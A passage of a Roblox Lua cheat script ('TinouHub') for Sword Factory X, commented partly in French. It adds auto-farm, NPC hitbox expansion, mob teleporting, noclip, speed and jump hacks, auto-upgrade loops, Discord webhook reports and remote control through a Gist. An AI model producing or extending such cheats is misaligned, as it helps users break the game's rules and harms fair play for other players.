uiAutoSell = Tab:CreateToggle({ Name="Auto-Sell after bank",      CurrentValue=AUTO_SELL, Flag="AutoSell", Callback=function(v) AUTO_SELL=v saveConfig() end })
uiMatchAll = Tab:CreateToggle({ Name="Match ALL enchants",        CurrentValue=MATCH_ALL, Flag="MatchAll", Callback=function(v) MATCH_ALL=v saveConfig() end })
uiScanRate = Tab:CreateSlider({ Name="Scan Rate (s)", Range={0.1,3}, Increment=0.1, CurrentValue=SCAN_RATE, Flag="ScanRate", Callback=function(v) SCAN_RATE=v saveConfig() end })

Tab:CreateSection("Webhook")
local function webhookStatus() return WEBHOOK_URL=="" and "Not configured" or "..."..(WEBHOOK_URL:sub(-20)) end
local webhookLbl = Tab:CreateLabel(webhookStatus())
Tab:CreateInput({ Name="Webhook URL", PlaceholderText="https://discord.com/api/webhooks/...", RemoveTextAfterFocusLost=false, Flag="WebhookURL",
    Callback=function(val)
        if val=="" then return end
        WEBHOOK_URL=val saveConfig()
        pcall(function() webhookLbl:Set(webhookStatus()) end)
        Rayfield:Notify({Title="Webhook", Content="Saved!", Duration=2})
    end })

Tab:CreateSection("Control")
statusLbl = Tab:CreateLabel("Status: Ready")
Tab:CreateButton({ Name="Start Scanner", Callback=function()
    if not scanning then startScan(statusLbl) Rayfield:Notify({Title="Scanner", Content="Started!", Duration=2}) end
end })
Tab:CreateButton({ Name="Stop Scanner", Callback=function()
    scanning=false Rayfield:Notify({Title="Scanner", Content="Stopped.", Duration=2})
end })

-- ===================== PROFILES =====================
local ProfTab = Window:CreateTab("Profiles", "star")
local function getOpt(o) return type(o)=="table" and o[1] or o end

for i = 1, 3 do
    local prof = profiles[i]
    uiProfileSlot[i] = {}
    ProfTab:CreateSection("Profile "..i)
    uiProfileToggle[i] = ProfTab:CreateToggle({ Name="Enable Profile "..i, CurrentValue=prof.active, Flag="P"..i.."On",
        Callback=function(v) profiles[i].active=v saveConfig() end })
    uiProfileSlot[i][1] = ProfTab:CreateDropdown({ Name="Enchant 1", Options=enchantList, CurrentOption=prof.slots[1], MultipleOptions=false, Flag="P"..i.."S1",
        Callback=function(o) profiles[i].slots[1]=getOpt(o) saveConfig() end })
    uiProfileSlot[i][2] = ProfTab:CreateDropdown({ Name="Enchant 2", Options=enchantList, CurrentOption=prof.slots[2], MultipleOptions=false, Flag="P"..i.."S2",
        Callback=function(o) profiles[i].slots[2]=getOpt(o) saveConfig() end })
    uiProfileSlot[i][3] = ProfTab:CreateDropdown({ Name="Enchant 3", Options=enchantList, CurrentOption=prof.slots[3], MultipleOptions=false, Flag="P"..i.."S3",
        Callback=function(o) profiles[i].slots[3]=getOpt(o) saveConfig() end })
end

-- ===================== SETTINGS =====================
local SettingsTab = Window:CreateTab("Settings", "settings")

SettingsTab:CreateSection("General")
SettingsTab:CreateToggle({ Name="Anti-AFK", CurrentValue=ANTI_AFK, Flag="AntiAFK", Callback=function(v) ANTI_AFK=v saveConfig() end })

SettingsTab:CreateSection("Actions")
SettingsTab:CreateButton({ Name="Sell All", Callback=function()
    pcall(function() remoteFunc:InvokeServer("Sell All") end)
    Rayfield:Notify({Title="Sell", Content="Sold!", Duration=2})
end })
SettingsTab:CreateButton({ Name="Save Config", Callback=function() saveConfig() Rayfield:Notify({Title="Config", Content="Saved!", Duration=2}) end })
SettingsTab:CreateButton({ Name="Load Config", Callback=function() loadConfig() Rayfield:Notify({Title="Config", Content="Loaded! Restart to apply.", Duration=3}) end })


SettingsTab:CreateSection("Webhook Status")
SettingsTab:CreateSlider({ Name="Rapport auto (minutes, 0=désactivé)", Range={0,60}, Increment=5, CurrentValue=STATUS_INTERVAL, Flag="StatusInterval",
    Callback=function(v) STATUS_INTERVAL=v saveConfig() end })
SettingsTab:CreateButton({ Name="Envoyer un rapport maintenant", Callback=function()
    if WEBHOOK_URL=="" then Rayfield:Notify({Title="Statut", Content="Webhook non configuré!", Duration=3}) return end
    sendStatusReport()
    Rayfield:Notify({Title="Statut", Content="Rapport envoyé!", Duration=2})
end })

SettingsTab:CreateSection("Discord Control")
SettingsTab:CreateLabel("Contrôle actif via Gist ID intégré au script.")
SettingsTab:CreateLabel("Gist ID: "..GIST_ID_LUA:sub(1,8).."...")

SettingsTab:CreateSection("Info")
SettingsTab:CreateLabel("TinouHub v"..VERSION.." | Sword Factory X")
SettingsTab:CreateLabel("github.com/ImTinou/sword")

-- Tab Farm
local FarmTab = Window:CreateTab("Farm", "zap")

-- Zones dans l'ordre de level requirement (IDs 1→9)
local zoneList = {
    "Beginner's Trials",   -- lvl 0   ID 1
    "Mystical Forest",     -- lvl 20  ID 2
    "Stranded Island",     -- lvl 75  ID 3
    "Snowy Fields",        -- lvl 120 ID 4
    "Crystal Caverns",     -- lvl 200 ID 5
    "Volcanic Isles",      -- lvl 300 ID 6
    "Intraplanetarium",    -- lvl 420 ID 7
    "Ancient Mineshaft",   -- lvl 510 ID 8
    "Heavenly Gates",      -- lvl 600 ID 9
}

-- Mapping zone name -> area ID (remote arg "Teleport Area", [id])
local zoneIds = {
    ["Beginner's Trials"]  = 1,
    ["Mystical Forest"]    = 2,
    ["Stranded Island"]    = 3,
    ["Snowy Fields"]       = 4,
    ["Crystal Caverns"]    = 5,
    ["Volcanic Isles"]     = 6,
    ["Intraplanetarium"]   = 7,
    ["Ancient Mineshaft"]  = 8,
    ["Heavenly Gates"]     = 9,
}

local selectedZone    = "Beginner's Trials"
local MIN_HP_PCT      = 0.35
local FARM_POS_MODE   = "Above"
local FARM_Y_OFFSET   = 5
local farmSafePos     = nil
local FARM_REACH      = 10
local FARM_NOCLIP     = true
local FARM_AUTO_PULL  = false
local VU              = game:GetService("VirtualUser")
local RunService      = game:GetService("RunService")
local farmHpConn      = nil

local expandedNpcs = {}
local function expandHitbox(npc)
    if expandedNpcs[npc] then return end
    expandedNpcs[npc] = true
    pcall(function()
        local root = npc:FindFirstChild("HumanoidRootPart")
        if root then
            root.Size = Vector3.new(FARM_REACH, FARM_REACH, FARM_REACH)
        end
    end)
end

local function getHpPct()
    local char = player.Character
    if not char then return 0 end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.MaxHealth == 0 then return 1 end
    return hum.Health / hum.MaxHealth
end

local function activateTool()
    pcall(function()
        local char = player.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if tool then tool:Activate() end
    end)
end

local function retreatAndHeal(lbl)
    pcall(function() end) -- placeholder, no Button1Up needed anymore
    -- Teleport to safe spot
    local char = player.Character
    if char and farmSafePos then
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = farmSafePos end
    end
    -- Wait for regen (>80% HP)
    local t = 0
    while getHpPct() < 0.8 and farming do
        t = t + 0.5
        pcall(function() lbl:Set("Low HP! Healing... ("..math.floor(getHpPct()*100).."%)") end)
        task.wait(0.5)
        if t > 30 then break end  -- max 30s wait
    end
end

local function getNpcsInZone()
    local npcs = {}
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local npcFolder = workspace:FindFirstChild("NPCs") or workspace:FindFirstChild("Mobs") or workspace:FindFirstChild("Enemies")
    if not npcFolder then return npcs end
    for _, npc in pairs(npcFolder:GetChildren()) do
        local hum = npc:FindFirstChildOfClass("Humanoid")
        local npcRoot = npc:FindFirstChild("HumanoidRootPart")
        if hum and hum.Health > 0 and npcRoot then
            if not hrp or (npcRoot.Position - hrp.Position).Magnitude < 600 then
                table.insert(npcs, npc)
            end
        end
    end
    return npcs
end

-- Teleporte tous les mobs sur le joueur ET disable leur CanCollide (coupe leurs hitboxes d'attaque)
local function pullMobsToPlayer()
    local char = player.Character
    if not char then return 0 end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return 0 end
    local npcs = getNpcsInZone()
    local count = 0
    for _, npc in ipairs(npcs) do
        pcall(function()
            local npcRoot = npc:FindFirstChild("HumanoidRootPart")
            if not npcRoot then return end
            -- Disable CanCollide sur TOUTES les parts du mob → coupe leurs hitboxes d'attaque
            -- (les Touched events server-side ne fire pas si CanCollide=false des deux côtés)
            for _, part in pairs(npc:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
            -- Expand hitbox pour que le joueur les hit tous en un swing
            expandHitbox(npc)
            -- Teleport groupé autour du joueur (offset aléatoire pour pas superposer)
            local ox = math.random(-3, 3)
            local oz = math.random(-3, 3)
            npcRoot.CFrame = hrp.CFrame + Vector3.new(ox, 0, oz)
            count = count + 1
        end)
    end
    return count
end

local function goUnderNpc(npc)
    local char = player.Character
    if not char then return end
    local hrp     = char:FindFirstChild("HumanoidRootPart")
    local npcRoot = npc:FindFirstChild("HumanoidRootPart")
    if not hrp or not npcRoot then return end
    expandHitbox(npc)
    local p = npcRoot.Position
    if FARM_POS_MODE == "Below" then
        hrp.CFrame = CFrame.new(p.X, p.Y - FARM_Y_OFFSET, p.Z)
    elseif FARM_POS_MODE == "Above" then
        hrp.CFrame = CFrame.new(p.X, p.Y + FARM_Y_OFFSET, p.Z)
    elseif FARM_POS_MODE == "Behind" then
        hrp.CFrame = npcRoot.CFrame * CFrame.new(0, 0, FARM_Y_OFFSET)
    end
end

FarmTab:CreateSection("Zone")

FarmTab:CreateDropdown({
    Name            = "Select Zone",
    Options         = zoneList,
    CurrentOption   = "Beginner's Trials",
    MultipleOptions = false,
    Callback        = function(opt)
        selectedZone = type(opt) == "table" and opt[1] or opt
    end,
})

FarmTab:CreateSection("Options")

FarmTab:CreateDropdown({
    Name            = "Position",
    Options         = {"Above","Below","Behind"},
    CurrentOption   = "Above",
    MultipleOptions = false,
    Flag            = "FarmPosMode",
    Callback        = function(opt)
        FARM_POS_MODE = type(opt) == "table" and opt[1] or opt
    end,
})

FarmTab:CreateToggle({
    Name         = "Noclip (mobs peuvent pas te toucher)",
    CurrentValue = true,
    Flag         = "FarmNoclip",
    Callback     = function(v) FARM_NOCLIP = v end,
})

FarmTab:CreateSlider({
    Name         = "Offset (studs)",
    Range        = {5, 60},
    Increment    = 5,
    CurrentValue = 5,
    Flag         = "FarmYOffset",
    Callback     = function(val) FARM_Y_OFFSET = val end,
})

FarmTab:CreateSlider({
    Name         = "Hitbox Reach (HRP size)",
    Range        = {4, 50},
    Increment    = 2,
    CurrentValue = 10,
    Flag         = "FarmReach",
    Callback     = function(val) FARM_REACH = val expandedNpcs = {} end,
})

FarmTab:CreateSlider({
    Name         = "Min HP before retreat (%)",
    Range        = {10, 80},
    Increment    = 5,
    CurrentValue = 35,
    Flag         = "FarmMinHp",
    Callback     = function(val) MIN_HP_PCT = val / 100 end,
})

FarmTab:CreateToggle({
    Name         = "Auto-Pull Mobs (ramène tous les mobs sur toi)",
    CurrentValue = false,
    Flag         = "FarmAutoPull",
    Callback     = function(v) FARM_AUTO_PULL = v end,
})


FarmTab:CreateSection("Control")

local farmStatusLbl = FarmTab:CreateLabel("Farm: Idle")

FarmTab:CreateButton({
    Name     = "Pull All Mobs Now",
    Callback = function()
        local n = pullMobsToPlayer()
        Rayfield:Notify({Title="Pull Mobs", Content=n.." mobs téléportés sur toi!", Duration=3})
    end,
})

FarmTab:CreateButton({
    Name     = "Teleport to Zone",
    Callback = function()
        local id = zoneIds[selectedZone]
        if not id then
            Rayfield:Notify({Title="Farm", Content="Zone ID unknown.", Duration=2})
            return
        end
        local ok, err = pcall(function()
            remoteFunc:InvokeServer("Teleport Area", id)
        end)
        if ok then
            Rayfield:Notify({Title="Farm", Content="TP -> "..selectedZone, Duration=3})
        else
            Rayfield:Notify({Title="Farm", Content="TP error: "..(err or "?"), Duration=5})
        end
    end,
})

FarmTab:CreateButton({
    Name     = "Start Farm",
    Callback = function()
        if farming then return end
        farming = true
        -- Save starting position as safe spot
        local char = player.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then farmSafePos = hrp.CFrame end
        end
        -- Death handling: if player dies, stop farm
        local deathConn
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                deathConn = hum.Died:Connect(function()
                    farming = false
                    pcall(function() farmStatusLbl:Set("Farm: Stopped (death)") end)
                    Rayfield:Notify({Title="Farm", Content="Died! Farm stopped.", Duration=4})
                end)
            end
        end
        -- HP monitor séparé: noclip + fuite instantanée sur Heartbeat
        if farmHpConn then farmHpConn:Disconnect() end
        farmHpConn = RunService.Heartbeat:Connect(function()
            if not farming then farmHpConn:Disconnect() farmHpConn = nil return end
            local char = player.Character
            if not char then return end
            -- Noclip auto
            if FARM_NOCLIP then
                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end
            -- Fuite instantanée si HP trop bas
            if getHpPct() < MIN_HP_PCT and farmSafePos then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CFrame = farmSafePos end
            end
        end)

        -- Boucle auto-pull: ramène tous les mobs sur le joueur toutes les 1s
        -- + re-disable leur CanCollide en continu (le serveur peut le reset)
        task.spawn(function()
            while farming do
                task.wait(1)
                if not FARM_AUTO_PULL or not farming then continue end
                pcall(function()
                    local char2 = player.Character
                    local hrp2 = char2 and char2:FindFirstChild("HumanoidRootPart")
                    if not hrp2 then return end
                    local npcs = getNpcsInZone()
                    for _, npc in ipairs(npcs) do
                        pcall(function()
                            -- Maintien CanCollide=false sur toutes les parts mob
                            for _, part in pairs(npc:GetDescendants()) do
                                if part:IsA("BasePart") then part.CanCollide = false end
                            end
                            local npcRoot = npc:FindFirstChild("HumanoidRootPart")
                            if npcRoot then
                                local ox = math.random(-3, 3)
                                local oz = math.random(-3, 3)
                                npcRoot.CFrame = hrp2.CFrame + Vector3.new(ox, 0, oz)
                            end
                        end)
                    end
                end)
            end
        end)

        task.spawn(function()
            local killed = 0
            while farming do
                if not player.Character then task.wait(1) continue end

                local npcs = getNpcsInZone()
                if #npcs == 0 then
                    -- Auto-TP vers la zone sélectionnée
                    pcall(function()
                        local id = zoneIds[selectedZone]
                        if id then remoteFunc:InvokeServer("Teleport Area", id) end
                    end)
                    pcall(function() farmStatusLbl:Set("Aucun mob → TP "..selectedZone) end)
                    task.wait(2)
                    continue
                end

                for _, npc in ipairs(npcs) do
                    if not farming then break end
                    if not npc.Parent then continue end
                    local hum = npc:FindFirstChildOfClass("Humanoid")
                    if not hum or hum.Health <= 0 then continue end

                    expandHitbox(npc)
                    goUnderNpc(npc)

                    while npc.Parent and hum.Health > 0 and farming do
                        if not player.Character then break end

                        if getHpPct() < MIN_HP_PCT then
                            retreatAndHeal(farmStatusLbl)
                            if not farming then break end
                            if not npc.Parent or hum.Health <= 0 then break end
                            goUnderNpc(npc)
                        end

                        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                        local npcRoot = npc:FindFirstChild("HumanoidRootPart")
                        if hrp and npcRoot and (hrp.Position - npcRoot.Position).Magnitude > FARM_REACH + 5 then
                            goUnderNpc(npc)
                        end

                        activateTool()
                        task.wait(0.1)
                    end

                    if not npc.Parent or hum.Health <= 0 then
                        killed = killed + 1
                        expandedNpcs[npc] = nil  -- reset pour re-expansion si respawn
                        pcall(function()
                            farmStatusLbl:Set("Kills: "..killed.." | HP: "..math.floor(getHpPct()*100).."%")
                        end)
                    end
                end
            end
            expandedNpcs = {}
            pcall(function() farmStatusLbl:Set("Farm: Stopped | Kills: "..killed) end)
            if deathConn then deathConn:Disconnect() end
        end)
    end,
})

FarmTab:CreateButton({
    Name     = "Stop Farm",
    Callback = function()
        farming = false
        Rayfield:Notify({Title="Farm", Content="Farm stopped.", Duration=2})
    end,
})

-- ===================== ASCENDER =====================
local AscTab = Window:CreateTab("Ascender", "trending-up")

AscTab:CreateSection("Config")
local ascStatusLbl = AscTab:CreateLabel("Ascender: Idle")
AscTab:CreateDropdown({ Name="Mode", Options={"Rarity","Quality","Level","Mold","Class","Enchant"}, CurrentOption="Rarity", MultipleOptions=false, Flag="AscMode",
    Callback=function(o) ascMode=type(o)=="table" and o[1] or o end })
AscTab:CreateDropdown({ Name="Stop at", Options=qualityOrder, CurrentOption="Godly", MultipleOptions=false, Flag="AscTarget",
    Callback=function(o) targetQuality=type(o)=="table" and o[1] or o end })

AscTab:CreateSection("Control")
AscTab:CreateButton({ Name="Start Auto-Ascend", Callback=function()
    if ascending then return end
    if not getAscenderSword() then Rayfield:Notify({Title="Ascender", Content="No sword in Ascender!", Duration=3}) return end
    ascending=true ascAttempts=0
    task.spawn(function()
        while ascending do
            local s = getAscenderSword()
            if not s then
                task.wait(1)
                s = getAscenderSword()
                if not s then
                    ascending=false
                    pcall(function() ascStatusLbl:Set("Sword introuvable") end)
                    break
                end
            end
            local q = "?"
            pcall(function() q = stripRichText(s.Main.Gui.ItemInfo.RarityQuality.Text) end)
            if qualityRank(q) >= qualityRank(targetQuality) then
                ascending=false
                pcall(function() ascStatusLbl:Set("Done! "..q.." | "..ascAttempts.." tries") end)
                Rayfield:Notify({Title="Ascender", Content=q.." in "..ascAttempts.." tries!", Duration=6})
                sendAscenderWebhook(s,q,ascAttempts) break
            end
            pcall(function() remote:FireServer("Set Ascender Mode", ascMode) end)
            ascAttempts=ascAttempts+1
            pcall(function() ascStatusLbl:Set(q.." | "..ascAttempts.." tries") end)
            task.wait(0.15)
        end
        ascending=false
    end)
    Rayfield:Notify({Title="Ascender", Content="Started!", Duration=2})
end })
AscTab:CreateButton({ Name="Stop", Callback=function() ascending=false Rayfield:Notify({Title="Ascender", Content="Stopped.", Duration=2}) end })
AscTab:CreateButton({ Name="Pickup Ascender Sword", Callback=function()
    local ok, err = pcall(function() remoteFunc:InvokeServer("Pickup Ascender") end)
    Rayfield:Notify({Title="Ascender", Content=ok and "Picked up!" or tostring(err), Duration=3})
end })

-- ===================== AUTO-UPGRADE =====================
local autoUpgrading = false
local upgEnabled = { Conveyor=false, Appraiser=false, Polisher=false, Upgrader=false, Molder=false, Classifier=false, Enchanter=false, Ascender=false }

local UpgTab = Window:CreateTab("Upgrade", "wrench")

UpgTab:CreateSection("Machines")
for _, machine in ipairs({"Conveyor","Appraiser","Polisher","Upgrader","Molder","Classifier","Enchanter","Ascender"}) do
    local m = machine
    UpgTab:CreateToggle({ Name=m, CurrentValue=false, Flag="Upg"..m, Callback=function(v) upgEnabled[m]=v end })
end

UpgTab:CreateSection("Control")
local upgStatusLbl = UpgTab:CreateLabel("Auto-Upgrade: Idle")
UpgTab:CreateButton({ Name="Upgrade Now", Callback=function()
    for _, m in ipairs({"Conveyor","Appraiser","Polisher","Upgrader","Molder","Classifier","Enchanter","Ascender"}) do
        if upgEnabled[m] then pcall(function() remoteFunc:InvokeServer("Upgrade Machine", m, 1) end) end
    end
    Rayfield:Notify({Title="Upgrade", Content="Done!", Duration=2})
end })
UpgTab:CreateButton({ Name="Start Auto-Upgrade", Callback=function()
    if autoUpgrading then return end
    autoUpgrading=true
    task.spawn(function()
        while autoUpgrading do
            local upgraded={}
            for _, m in ipairs({"Conveyor","Appraiser","Polisher","Upgrader","Molder","Classifier","Enchanter","Ascender"}) do
                if upgEnabled[m] then
                    pcall(function() remoteFunc:InvokeServer("Upgrade Machine", m, 1) end)
                    table.insert(upgraded, m)
                    task.wait(0.2)
                end
            end
            pcall(function() upgStatusLbl:Set(#upgraded>0 and "Upgraded: "..table.concat(upgraded,", ") or "No machine selected") end)
            task.wait(3)
        end
        pcall(function() upgStatusLbl:Set("Auto-Upgrade: Stopped") end)
    end)
    Rayfield:Notify({Title="Upgrade", Content="Auto-upgrade started!", Duration=2})
end })
UpgTab:CreateButton({ Name="Stop Auto-Upgrade", Callback=function()
    autoUpgrading=false Rayfield:Notify({Title="Upgrade", Content="Stopped.", Duration=2})
end })

UpgTab:CreateSection("Actions")

-- Max stats visuel côté client (affichage seulement, pas le serveur)
UpgTab:CreateButton({ Name="Max Sword Stats (visuel client)", Callback=function()
    task.spawn(function()
        local swords = workspace:FindFirstChild("Swords")
        if not swords then
            Rayfield:Notify({Title="Client Visual", Content="workspace.Swords introuvable", Duration=3})
            return
        end
        local count = 0
        for _, s in pairs(swords:GetChildren()) do
            pcall(function()
                s:SetAttribute("Rarity",       125)  -- Infinity+20
                s:SetAttribute("Class",        55)   -- Astronomical+20
                s:SetAttribute("Quality",      100)
                s:SetAttribute("Level",        9999)
                s:SetAttribute("Mold",         41)   -- Iridium+20
                s:SetAttribute("Enchant1",     15)   -- Knockback (rarest)
                s:SetAttribute("Enchant2",     15)
                s:SetAttribute("Enchant3",     15)
                s:SetAttribute("Enchant4",     15)
                s:SetAttribute("EnchantLevel1",5000)
                s:SetAttribute("EnchantLevel2",5000)
                s:SetAttribute("EnchantLevel3",5000)
                s:SetAttribute("EnchantLevel4",5000)
                count = count + 1
            end)
        end
        Rayfield:Notify({Title="Client Visual", Content=count.." swords modifiés (visuel only)", Duration=4})
    end)
end })

-- Bank TOUS les swords de la factory d'un coup (sans flyPickup)
UpgTab:CreateButton({ Name="Bank All Factory Swords", Callback=function()
    task.spawn(function()
        local RS = game:GetService("ReplicatedStorage")
        local pStats = RS:FindFirstChild("Stats") and RS.Stats:FindFirstChild(player.Name)
        local factory = pStats and pStats:FindFirstChild("Factory")
        if not factory then
            Rayfield:Notify({Title="Factory", Content="Pas de factory trouvée!", Duration=3})
            return
        end
        local count = 0
        for _, s in pairs(factory:GetChildren()) do
            pcall(function() remote:FireServer("Set Hotbar", s.Name, "Inventory") end)
            count = count + 1
            task.wait(0.15)
        end
        Rayfield:Notify({Title="Factory", Content=count.." swords bankés!", Duration=3})
    end)
end })

-- Sell ALL factory swords directement
UpgTab:CreateButton({ Name="Sell All Factory Swords", Callback=function()
    task.spawn(function()
        local RS = game:GetService("ReplicatedStorage")
        local pStats = RS:FindFirstChild("Stats") and RS.Stats:FindFirstChild(player.Name)
        local factory = pStats and pStats:FindFirstChild("Factory")
        if not factory then return end
        for _, s in pairs(factory:GetChildren()) do
            pcall(function() remote:FireServer("Set Hotbar", s.Name, "Inventory") end)
            task.wait(0.1)
        end
        task.wait(0.3)
        pcall(function() remoteFunc:InvokeServer("Sell All") end)
        Rayfield:Notify({Title="Factory", Content="Tous vendus!", Duration=3})
    end)
end })

UpgTab:CreateButton({ Name="Spawn Sword (spam x10)", Callback=function()
    task.spawn(function()
        for i = 1, 10 do
            pcall(function() remoteFunc:InvokeServer("Spawn Sword") end)
            task.wait(0.4)
        end
        Rayfield:Notify({Title="Spawn", Content="10 spawn envoyés!", Duration=3})
    end)
end })

-- ===================== MISC / PLAYER =====================
local MiscTab = Window:CreateTab("Misc", "zap")

MiscTab:CreateSection("💀 Kill Scripts")

MiscTab:CreateButton({ Name="DESTROY ALL SCRIPTS", Callback=function()
    task.spawn(function()
        -- 1. Stop nos propres loops
        scanning  = false
        farming   = false
        ascending = false

        -- 2. Set global kill flag (arrête les scripts qui le vérifient)
        pcall(function() getgenv()._KILL_ALL = true end)

        -- 3. Destroy tous les ScreenGuis injectés dans CoreGui
        pcall(function()
            for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
                pcall(function()
                    if v:IsA("ScreenGui") or v:IsA("Frame") or v:IsA("Folder") then
                        v:Destroy()
                    end
                end)
            end
        end)

        -- 4. Destroy tous les ScreenGuis injectés dans PlayerGui
        pcall(function()
            for _, v in pairs(player.PlayerGui:GetChildren()) do
                pcall(function()
                    -- Les GUIs du jeu ont ResetOnSpawn=true, les injectés souvent false
                    if v:IsA("ScreenGui") and v.ResetOnSpawn == false then
                        v:Destroy()
                    end
                end)
            end
        end)

        -- 5. Désactive tous les LocalScripts injectés dans PlayerScripts / Character
        pcall(function()
            for _, v in pairs(player.PlayerScripts:GetDescendants()) do
                if v:IsA("LocalScript") then
                    pcall(function() v.Disabled = true end)
                end
            end
        end)
        pcall(function()
            if player.Character then
                for _, v in pairs(player.Character:GetDescendants()) do
                    if v:IsA("LocalScript") then
                        pcall(function() v.Disabled = true end)
                    end
                end
            end
        end)

        -- 6. Reload character = nuclear option (reset tout)
        pcall(function() player:LoadCharacter() end)

        print("[KILL] All scripts destroyed.")
    end)
end })

MiscTab:CreateSection("Player")

local speedEnabled = false
local noclipEnabled = false
local origSpeed = 16
local origJump  = 50

local function getHum()
    local c = player.Character
    return c and c:FindFirstChildOfClass("Humanoid")
end

local uiSpeed = MiscTab:CreateSlider({ Name="WalkSpeed", Range={16,300}, Increment=4, CurrentValue=16, Flag="WalkSpeed",
    Callback=function(v)
        pcall(function()
            local hum = getHum()
            if hum then hum.WalkSpeed = v end
        end)
    end
})

local uiJump = MiscTab:CreateSlider({ Name="JumpPower", Range={50,500}, Increment=10, CurrentValue=50, Flag="JumpPower",
    Callback=function(v)
        pcall(function()
            local hum = getHum()
            if hum then hum.JumpPower = v end
        end)
    end
})

-- Respawn remet les valeurs → les remettre à chaque respawn
player.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        if speedEnabled then hum.WalkSpeed = origSpeed end
        if noclipEnabled then
            game:GetService("RunService").Stepped:Connect(function()
                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end)
        end
    end
end)

MiscTab:CreateToggle({ Name="Noclip", CurrentValue=false, Flag="Noclip",
    Callback=function(v)
        noclipEnabled = v
        if v then
            game:GetService("RunService").Stepped:Connect(function()
                if not noclipEnabled then return end
                local char = player.Character
                if not char then return end
                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end)
            Rayfield:Notify({Title="Noclip", Content="ON", Duration=2})
        else
            -- Re-enable collision
            local char = player.Character
            if char then
                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = true end
                end
            end
            Rayfield:Notify({Title="Noclip", Content="OFF", Duration=2})
        end
    end
})

MiscTab:CreateToggle({ Name="Infinite Jump", CurrentValue=false, Flag="InfJump",
    Callback=function(v)
        if v then
            game:GetService("UserInputService").JumpRequest:Connect(function()
                local hum = getHum()
                if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
            end)
            Rayfield:Notify({Title="Infinite Jump", Content="ON", Duration=2})
        end
    end
})

MiscTab:CreateSection("Teleport")

MiscTab:CreateButton({ Name="TP to Base", Callback=function()
    pcall(function() remoteFunc:InvokeServer("Teleport In Base", "Home") end)
    Rayfield:Notify({Title="TP", Content="→ Base", Duration=2})
end })

for zoneName, zoneId in pairs(zoneIds) do
    local zn = zoneName
    local zi = zoneId
    MiscTab:CreateButton({ Name="TP → "..zn, Callback=function()
        pcall(function() remoteFunc:InvokeServer("Teleport Area", zi) end)
        Rayfield:Notify({Title="TP", Content="→ "..zn, Duration=2})
    end })
end

MiscTab:CreateSection("Actions")

MiscTab:CreateButton({ Name="Sell All (inventaire)", Callback=function()
    pcall(function() remoteFunc:InvokeServer("Sell All") end)
    Rayfield:Notify({Title="Sell", Content="Sold!", Duration=2})
end })

MiscTab:CreateButton({ Name="Drop Sword équipé", Callback=function()
    pcall(function() remote:FireServer("Drop Sword") end)
    Rayfield:Notify({Title="Drop", Content="Dropped!", Duration=2})
end })

MiscTab:CreateButton({ Name="Drop ALL inventaire", Callback=function()
    task.spawn(function()
        local RS = game:GetService("ReplicatedStorage")
        local pStats = RS:FindFirstChild("Stats") and RS.Stats:FindFirstChild(player.Name)
        if not pStats then return end
        local swords = pStats:FindFirstChild("Swords")
        if not swords then
            Rayfield:Notify({Title="Drop All", Content="Inventaire vide!", Duration=2})
            return
        end
        local count = 0
        for _, s in pairs(swords:GetChildren()) do
            pcall(function() remote:FireServer("Drop Sword", s.Name) end)
            count = count + 1
            task.wait(0.1)
        end
        Rayfield:Notify({Title="Drop All", Content=count.." swords droppés!", Duration=3})
    end)
end })

MiscTab:CreateButton({ Name="Unequip tout", Callback=function()
    pcall(function() remote:FireServer("Unequip All") end)
    Rayfield:Notify({Title="Unequip", Content="Done!", Duration=2})
end })
